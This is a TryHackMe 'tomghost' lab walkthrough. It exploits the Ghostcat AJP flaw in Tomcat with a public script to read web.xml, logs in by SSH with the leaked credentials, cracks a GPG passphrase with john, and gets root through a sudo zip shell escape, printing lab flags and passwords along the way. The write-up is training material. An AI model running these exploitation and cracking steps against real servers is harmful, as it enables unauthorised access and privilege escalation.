---
title: "Tryhackme - tomghost WriteUp"
date: 2020-10-21
tags: [tryhackme, walkthrough, linux]
header:
  image: "/images/not-found.gif"
excerpt: "Walkthroughs"
---


# TryHackMe - tomghost WriteUp

**Keywords**: ghostcat, tomcat, ajp, xray, gpg2john, gpg

## Information Gathering

### nmap

```
root@kali:~/TryHackMe# nmap -sC -sV -p- -T4 -A 10.10.7.42
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
```


**Affected Versions**:
  - Apache Tomcat < 9.0.31
  - Apache Tomcat < 8.5.51
  - Apache Tomcat < 7.0.100

**Cause**: insecure configuration of AJP Protocol

By default, Tomcat treats AJP connections as having a higher level of trust, when compared to HTTP connections. When AJP is implemented correctly, the protocol requires a secret, which is required by anyone who queries the protocol. When using the default Tomcat configuration, this secret is not enabled, meaning that no security check is done to requests coming into port 8009. This means that an unauthenticated attacker can access the port to read or potentially write to the server.

In most cases, this vulnerability will allow an attacker to read any resources that exist on the Tomcat server. This means that any server or configuration files could be leaked. The severity of this varies based on what is contained in the source code and configuration files.

The worst case of this attack occurs when an application allowsa user to upload files. In this case, an attacker can upload a malicious jsp file, and access it with their browser, resulting in remote code execution. This type of attack can result in a full compromise of the affected server.

**For detect vulnerability**: https://www.claudiokuenzler.com/blog/946/how-to-detect-ghostcat-ajp-tomcat-vulnerability-cve-2020-1938


## Enumeration

### xray [Vuln Scanning]

Download it:

```
wget https://github.com/chaitin/xray/releases/download/1.3.3/xray_linux_amd64.zip
root@kali:~/TryHackMe# unzip xray_linux_amd64.zip
```

```
root@kali:~/TryHackMe# ./xray_linux_amd64 servicescan --target 10.10.7.42:8009

____  ___.________.    ____.   _____.___.
\   \/  /\_   __   \  /  _  \  \__  |   |
 \     /  |    _  _/ /  /_\  \  /   |   |
 /     \  |    |   \/    |    \ \____   |
\___/\  \ |____|   /\____|_   / / _____/
      \_/       \_/        \_/  \/

Version: 1.3.3/1d166d72/COMMUNITY

[INFO] 2020-10-21 12:50:37 [default:entry.go:122] set file descriptor limit to 10000
Generate default configurations to config.yaml
[INFO] 2020-10-21 12:50:37 [default:entry.go:157] loading config file from /root/TryHackMe/config.yaml
[INFO] 2020-10-21 12:50:40 [default:single.go:76] set plugins parallel to 30
[INFO] 2020-10-21 12:50:40 [default:single.go:237] processing 10.10.7.42:8009
[INFO] 2020-10-21 12:50:40 [default:single.go:339] wait for task done
[INFO] 2020-10-21 12:50:41 [go-poc:tomcat-cve-2020-1938.go:280] ajp protocol found in 10.10.7.42:8009, status code 404
[INFO] 2020-10-21 12:50:41 [go-poc:tomcat-cve-2020-1938.go:140] found tomcat version 9.0.30
[Vuln: poc-go-tomcat-cve-2020-1938]
Target           "10.10.7.42:8009"
status_code      "404"
body             "\\x02\\xd3\\x03\\x02\\xcf<!doctype html><html lang=\"en\"><head><title>HTTP Status 404 – Not Found</title><style type=\"text/css\">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 – Not Found</h1><hr class=\"line\" /><p><b>Type</b> Status Report</p><p><b>Message</b> &#47;didpoy.jsp</p><p><b>Description</b> The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.</p><hr class=\"line\" /><h3>Apache Tomcat/9.0.30</h3></body></html>\\x00AB"
method           "version_match"
read_file        "/didpoy.jsp"
```

## Exploitation

Download exploit:

```
root@kali:~/TryHackMe# git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487.git
Cloning into 'Ghostcat-CNVD-2020-10487'...
remote: Enumerating objects: 50, done.
remote: Counting objects: 100% (50/50), done.
remote: Compressing objects: 100% (49/49), done.
remote: Total 50 (delta 17), reused 2 (delta 0), pack-reused 0
Unpacking objects: 100% (50/50), 1.76 MiB | 500.00 KiB/s, done.
root@kali:~/TryHackMe# cd Ghostcat-CNVD-2020-10487/
root@kali:~/TryHackMe/Ghostcat-CNVD-2020-10487# ls
ajp-execute.png  ajp-read.png  ajp-save.png  ajpShooter.py  README.md
```

Exploit it:

```
root@kali:~/TryHackMe/Ghostcat-CNVD-2020-10487# python3 ajpShooter.py http://10.10.7.42:8080/demo 8009 /WEB-INF/web.xml read

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"1261-1583902632000"
[<] Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
[<] Content-Type: application/xml
[<] Content-Length: 1261

<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
root@kali:~/TryHackMe/Ghostcat-CNVD-2020-10487#
```

Founded credentials: skyfuck:8730281lkjlkjdqlksalks

### ssh

```
root@kali:~/TryHackMe# ssh skyfuck@10.10.7.42
The authenticity of host '10.10.7.42 (10.10.7.42)' can't be established.
ECDSA key fingerprint is SHA256:hNxvmz+AG4q06z8p74FfXZldHr0HJsaa1FBXSoTlnss.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.7.42' (ECDSA) to the list of known hosts.
skyfuck@10.10.7.42's password: 8730281lkjlkjdqlksalks
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

skyfuck@ubuntu:~$ 
```

**user.txt**

```
skyfuck@ubuntu:~$ find / -name "user.txt" -print 2>/dev/null
/home/merlin/user.txt
skyfuck@ubuntu:~$ cat /home/merlin/user.txt 
THM{GhostCat_1s_so_cr4sy}
```


Some files have found.

```
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
```


Download them to the local machine:

```
root@kali:~/TryHackMe# wget http://10.10.7.42:8000/credential.pgp
--2020-10-21 12:59:49--  http://10.10.7.42:8000/credential.pgp
Connecting to 10.10.7.42:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 394 [application/pgp-encrypted]
Saving to: ‘credential.pgp’

credential.pgp                       100%[===================================================================>]     394  --.-KB/s    in 0s      

2020-10-21 12:59:50 (11.4 MB/s) - ‘credential.pgp’ saved [394/394]

root@kali:~/TryHackMe# wget http://10.10.7.42:8000/tryhackme.asc
--2020-10-21 12:59:57--  http://10.10.7.42:8000/tryhackme.asc
Connecting to 10.10.7.42:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5144 (5.0K) [text/plain]
Saving to: ‘tryhackme.asc’

tryhackme.asc                        100%[===================================================================>]   5.02K  --.-KB/s    in 0.01s   

2020-10-21 12:59:58 (449 KB/s) - ‘tryhackme.asc’ saved [5144/5144]
```


### gpg2john

```
root@kali:~/TryHackMe# gpg2john tryhackme.asc > hash

File tryhackme.asc
root@kali:~/TryHackMe# cat hash 
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc
root@kali:~/TryHackMe# john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
No password hashes left to crack (see FAQ)
root@kali:~/TryHackMe# john hash --show
tryhackme:alexandru:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc

1 password hash cracked, 0 left
```


### gpg

```
root@kali:~/TryHackMe# gpg --import tryhackme.asc 
gpg: key 8F3DA3DEC6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
root@kali:~/TryHackMe# gpg --decrypt credential.pgp 
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

### ssh

```
root@kali:~/TryHackMe# ssh merlin@10.10.7.42
merlin@10.10.7.42's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Tue Mar 10 22:56:49 2020 from 192.168.85.1
merlin@ubuntu:~$ 
```


## Privilege Escalation

**root.txt**

```
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# whoami
root
# cd /root/
# ls
root.txt  ufw
# cat root.txt
THM{Z1P_1S_FAKE}
```